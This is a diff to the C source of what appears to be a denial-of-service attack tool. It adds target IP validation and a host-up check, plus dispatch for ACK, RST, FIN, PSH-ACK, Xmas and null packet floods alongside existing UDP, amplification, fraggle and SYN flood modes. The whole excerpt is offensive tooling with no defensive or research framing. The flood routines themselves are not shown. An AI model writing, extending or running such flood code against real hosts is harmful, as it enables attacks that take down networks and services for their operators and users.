@@ -145,12 +145,31 @@ static void _parse_atks(int _argc, char **_argv) {
 		exit(EXIT_FAILURE);
 	}
 
+	/* check if ip addr is valid  */
+	if(!validate_ip(atk->atk_target)) {
+		LOG_ERROR("Invalid Ip Address: %s", atk->atk_target);
+		exit(EXIT_FAILURE);
+	}
+
+	/* check if target is up  */
+	if(!is_target_up(atk->atk_target, atoi(atk->atk_port))) {
+		LOG_ERROR("Failed to connect to %s (host is down)", atk->atk_target);
+	}
+
+	/* TODO: Add target_addr resolve to ip addr */
+
 	if (strcmp(atk->atk_type, "udp") == 0) perform_udp_flood(atk);
 	else if(strcmp(atk->atk_type, "ampl") == 0) perform_udp_ampl(atk);
 	else if(strcmp(atk->atk_type, "fraggle") == 0) perform_udp_fraggle(atk);
 	else if(strcmp(atk->atk_type, "ald") == 0) perform_udp_app_layer_dos(atk);
 	else if(strcmp(atk->atk_type, "sockex") == 0) perform_udp_socket_exhaustion(atk);
 	else if(strcmp(atk->atk_type, "syn") == 0) syn_flood(atk);
+	else if(strcmp(atk->atk_type, "ack") == 0) ack_flood(atk);
+	else if(strcmp(atk->atk_type, "rst") == 0) rst_flood(atk);
+	else if(strcmp(atk->atk_type, "fin") == 0) fin_flood(atk);
+	else if(strcmp(atk->atk_type, "psh_ack") == 0) psh_ack_flood(atk);
+	else if(strcmp(atk->atk_type, "xmas") == 0) xmas_flood(atk);
+	else if(strcmp(atk->atk_type, "null") == 0) null_flood(atk);
 	else {
 		LOG_ERROR("Invalid Attack: %s", atk->atk_type);
 		exit(EXIT_FAILURE);
